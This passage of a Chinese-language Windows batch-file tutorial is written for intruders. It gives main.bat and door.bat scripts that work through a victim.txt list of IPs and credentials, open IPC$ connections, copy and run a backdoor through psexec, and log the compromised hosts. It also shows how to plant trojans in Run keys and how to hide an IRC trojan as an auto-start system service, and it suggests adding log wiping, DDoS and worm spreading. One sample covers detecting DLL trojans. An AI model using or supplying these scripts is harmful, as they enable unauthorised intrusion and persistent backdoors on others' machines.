@@ -1,0 +1,244 @@
+主要命令也只有一条：（在批处理文件中使用 FOR 命令时，指定变量使用 %%variable）
+@for /f "tokens=1,2,3 delims= " %%i in (victim.txt) do start call door.bat %%i %%j %%k
+tokens的用法请参见上面的sample1，在这里它表示按顺序将victim.txt中的内容传递给door.bat中的参数%i %j %k。
+而cultivate.bat无非就是用net use命令来建立IPC$连接，并copy木马＋后门到victim，然后用返回码（If errorlever =）来筛选成功种植后门的主机，并echo出来，或者echo到指定的文件。
+delims= 表示vivtim.txt中的内容是一空格来分隔的。我想看到这里你也一定明白这victim.txt里的内容是什么样的了。应该根据%%i %%j %%k表示的对象来排列，一般就是 ip password username。
+代码雏形：
+--------------- cut here then save as a batchfile(I call it main.bat ) ---------------------------
+@echo off
+@if "%1"=="" goto usage
+@for /f "tokens=1,2,3 delims= " %%i in (victim.txt) do start call IPChack.bat %%i %%j %%k
+@goto end
+:usage
+@echo run this batch in dos modle.or just double-click it.
+:end
+--------------- cut here then save as a batchfile(I call it main.bat ) ---------------------------
+
+
+------------------- cut here then save as a batchfile(I call it door.bat) -----------------------------
+@net use \\%1\ipc$ %3 /u:"%2"
+@if errorlevel 1 goto failed
+@echo Trying to establish the IPC$ connection …………OK
+@copy windrv32.exe\\%1\admin$\system32 && if not errorlevel 1 echo IP %1 USER %2 PWD %3 >>ko.txt
+@p***ec \\%1 c:\winnt\system32\windrv32.exe
+@p***ec \\%1 net start windrv32 && if not errorlevel 1 echo %1 Backdoored >>ko.txt
+:failed
+@echo Sorry can not connected to the victim.
+----------------- cut here then save as a batchfile(I call it door.bat) --------------------------------
+这只是一个自动种植后门批处理的雏形，两个批处理和后门程序（Windrv32.exe）,P***ec.exe需放在统一目录下.批处理内容
+尚可扩展,例如:加入清除日志+DDOS的功能,加入定时添加用户的功能,更深入一点可以使之具备自动传播功能(蠕虫).此处不多做叙述,有兴趣的朋友可自行研究.
+
+
+
+
+
+
+
+
+
+二.如何在批处理文件中使用参数
+批处理中可以使用参数，一般从1%到 9%这九个，当有多个参数时需要用shift来移动，这种情况并不多见，我们就不考虑它了。
+sample1：fomat.bat
+@echo off
+if "%1"=="a" format a:
+:format
+@format a:/q/u/auotset
+@echo please insert another disk to driver A.
+@pause
+@goto fomat
+这个例子用于连续地格式化几张软盘，所以用的时候需在dos窗口输入fomat.bat a，呵呵,好像有点画蛇添足了～^_^
+sample2：
+当我们要建立一个IPC$连接地时候总要输入一大串命令，弄不好就打错了，所以我们不如把一些固定命令写入一个批处理，把肉鸡地ip password username 当着参数来赋给这个批处理，这样就不用每次都打命令了。
+@echo off
+@net use \\1%\ipc$ "2%" /u:"3%" 注意哦，这里PASSWORD是第二个参数。
+@if errorlevel 1 echo connection failed
+怎么样,使用参数还是比较简单的吧？你这么帅一定学会了^_^.
+
+三.如何使用组合命令(Compound Command)
+
+1.&
+
+Usage：第一条命令 & 第二条命令 [& 第三条命令...]
+
+用这种方法可以同时执行多条命令，而不管命令是否执行成功
+
+Sample：
+C:\>dir z: & dir c:\Ex4rch
+The system cannot find the path specified.
+Volume in drive C has no label.
+Volume Serial Number is 0078-59FB
+
+Directory of c:\Ex4rch
+
+2002-05-14 23:51
+.
+2002-05-14 23:51
+..
+2002-05-14 23:51 14 sometips.gif
+
+2.&&
+
+Usage：第一条命令 && 第二条命令 [&& 第三条命令...]
+
+用这种方法可以同时执行多条命令，当碰到执行出错的命令后将不执行后面的命令，如果一直没有出错则一直执行完所有命令；
+
+Sample：
+C:\>dir z: && dir c:\Ex4rch
+The system cannot find the path specified.
+
+C:\>dir c:\Ex4rch && dir z:
+Volume in drive C has no label.
+Volume Serial Number is 0078-59FB
+
+Directory of c:\Ex4rch
+
+2002-05-14 23:55
+.
+2002-05-14 23:55
+..
+2002-05-14 23:55 14 sometips.gif
+1 File(s) 14 bytes
+2 Dir(s) 768,671,744 bytes free
+The system cannot find the path specified.
+
+在做备份的时候可能会用到这种命令会比较简单，如：
+dir file://192.168.0.1/database/backup.mdb && copy file://192.168.0.1/database/backup.mdb E:\backup
+如果远程服务器上存在backup.mdb文件，就执行copy命令，若不存在该文件则不执行copy命令。这种用法可以替换IF exist了 ：）
+
+3.||
+
+Usage：第一条命令 || 第二条命令 [|| 第三条命令...]
+
+用这种方法可以同时执行多条命令，当碰到执行正确的命令后将不执行后面的命令，如果没有出现正确的命令则一直执行完所有命令；
+
+Sample：
+C:\Ex4rch>dir sometips.gif || del sometips.gif
+Volume in drive C has no label.
+Volume Serial Number is 0078-59FB
+
+Directory of C:\Ex4rch
+
+2002-05-14 23:55 14 sometips.gif
+1 File(s) 14 bytes
+0 Dir(s) 768,696,320 bytes free
+
+组合命令使用的例子：
+sample：
+@copy trojan.exe \\%1\admin$\system32 && if not errorlevel 1 echo IP %1 USER %2 PASS %3 >>victim.txt
+
+四、管道命令的使用
+
+1.| 命令
+Usage：第一条命令 | 第二条命令 [| 第三条命令...]
+将第一条命令的结果作为第二条命令的参数来使用，记得在unix中这种方式很常见。
+
+sample：
+time /t>>D:\IP.log
+netstat -n -p tcp|find ":3389">>D:\IP.log
+start Explorer
+看出来了么？用于终端服务允许我们为用户自定义起始的程序，来实现让用户运行下面这个bat，以获得登录用户的IP。
+
+2.>、>>输出重定向命令
+将一条命令或某个程序输出结果的重定向到特定文件中, > 与 >>的区别在于，>会清除调原有文件中的内容后写入指定文件，而>>只会追加内容到指定文件中，而不会改动其中的内容。
+
+sample1：
+echo hello world>c:\hello.txt (stupid example?)
+
+sample2:
+时下DLL木马盛行，我们知道system32是个捉迷藏的好地方，许多木马都削尖了脑袋往那里钻，DLL马也不例外，针对这一点我们可以在安装好系统和必要的应用程序后，对该目录下的EXE和DLL文件作一个记录：
+运行CMD--转换目录到system32--dir *.exe>exeback.txt & dir *.dll>dllback.txt,
+这样所有的EXE和DLL文件的名称都被分别记录到exeback.txt和dllback.txt中,
+日后如发现异常但用传统的方法查不出问题时,则要考虑是不是系统中已经潜入DLL木马了.
+这时我们用同样的命令将system32下的EXE和DLL文件记录到另外的exeback1.txt和dllback1.txt中,然后运行:
+CMD--fc exeback.txt exeback1.txt>diff.txt & fc dllback.txt dllback1.txt>diff.txt.(用FC命令比较前后两次的DLL和EXE文件,并将结果输入到diff.txt中),这样我们就能发现一些多出来的DLL和EXE文件,然后通过查看创建时间、版本、是否经过压缩等就能够比较容易地判断出是不是已经被DLL木马光顾了。没有是最好，如果有的话也不要直接DEL掉，先用regsvr32 /u trojan.dll将后门DLL文件注销掉,再把它移到回收站里，若系统没有异常反映再将之彻底删除或者提交给杀毒软件公司。
+
+3.< 、>& 、<&
+< 从文件中而不是从键盘中读入命令输入。
+>& 将一个句柄的输出写入到另一个句柄的输入中。
+<& 从一个句柄读取输入并将其写入到另一个句柄输出中。
+这些并不常用，也就不多做介绍。
+
+五.如何用批处理文件来操作注册表
+
+在入侵过程中经常回操作注册表的特定的键值来实现一定的目的，例如:为了达到隐藏后门、木马程序而删除Run下残余的键值。或者创建一个服务用以加载后门。当然我们也会修改注册表来加固系统或者改变系统的某个属性，这些都需要我们对注册表操作有一定的了解。下面我们就先学习一下如何使用.REG文件来操作注册表.(我们可以用批处理来生成一个REG文件)
+关于注册表的操作，常见的是创建、修改、删除。
+
+1.创建
+创建分为两种，一种是创建子项(Subkey)
+
+我们创建一个文件，内容如下：
+
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\hacker]
+
+然后执行该脚本，你就已经在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft下创建了一个名字为“hacker”的子项。
+
+另一种是创建一个项目名称
+那这种文件格式就是典型的文件格式，和你从注册表中导出的文件格式一致，内容如下：
+
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"Invader"="Ex4rch"
+"Door"=C:\\WINNT\\system32\\door.exe
+"Autodos"=dword:02
+
+这样就在[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]下
+新建了:Invader、door、about这三个项目
+Invader的类型是“String value”
+door的类型是“REG SZ value”
+Autodos的类型是“DWORD value”
+
+
+2.修改
+修改相对来说比较简单，只要把你需要修改的项目导出，然后用记事本进行修改，然后导入（regedit /s）即可。
+
+3.删除
+我们首先来说说删除一个项目名称，我们创建一个如下的文件：
+
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"Ex4rch"=-
+
+执行该脚本，[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]下的"Ex4rch"就被删除了；
+
+我们再看看删除一个子项，我们创建一个如下的脚本：
+
+Windows Registry Editor Version 5.00
+
+[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+
+执行该脚本，[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]就已经被删除了。
+
+相信看到这里，.reg文件你基本已经掌握了。那么现在的目标就是用批处理来创建特定内容的.reg文件了，记得我们前面说道的利用重定向符号可以很容易地创建特定类型的文件。
+
+samlpe1:如上面的那个例子,如想生成如下注册表文件
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"Invader"="Ex4rch"
+"door"=hex:255
+"Autodos"=dword:000000128
+只需要这样：
+@echo Windows Registry Editor Version 5.00>>Sample.reg
+
+@echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>Sample.reg
+@echo "Invader"="Ex4rch">>Sample.reg
+@echo "door"=5>>C:\\WINNT\\system32\\door.exe>>Sample.reg
+@echo "Autodos"=dword:02>>Sample.reg
+
+
+samlpe2:
+我们现在在使用一些比较老的木马时,可能会在注册表的[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run(Runonce、Runservices、Runexec)]下生成一个键值用来实现木马的自启动.但是这样很容易暴露木马程序的路径,从而导致木马被查杀,相对地若是将木马程序注册为系统服务则相对安全一些.下面以配置好地IRC木马DSNX为例(名为windrv32.exe)
+@start windrv32.exe
+@attrib +h +r windrv32.exe
+@echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >>patch.dll
+@echo "windsnx "=- >>patch.dll
+@sc.exe create Windriversrv type= kernel start= auto displayname= WindowsDriver binpath= c:\winnt\system32\windrv32.exe
+@regedit /s patch.dll
+@delete patch.dll
+
+@REM [删除DSNXDE在注册表中的启动项，用sc.exe将之注册为系统关键性服务的同时将其属性设为隐藏和只读，并config为自启动]
+@REM 这样不是更安全^_^.
